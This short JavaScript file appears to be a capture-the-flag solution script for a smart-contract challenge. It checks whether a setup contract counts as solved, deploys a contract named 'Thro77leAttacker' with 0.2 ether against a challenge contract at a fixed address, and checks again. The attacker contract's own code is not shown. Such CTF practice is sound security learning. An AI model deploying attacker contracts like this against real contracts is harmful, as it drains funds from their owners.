const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("Thro77leAttacker");

  const setup = await ethers.getContractAt( "Setup", "0xBF3e5530aB7Dcba712E3A7fA99463d46eb6a0c8e" );
  const ctf = await ethers.getContractAt( "Challenge", "0xd9C72eD9DdeF04D0Ab88aE2403C383Ffbd11a71c" );

  console.log("solved:", await setup.isSolved());

  await EXPLOIT.deploy(ctf.address, { value: parseEther("0.2") });

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
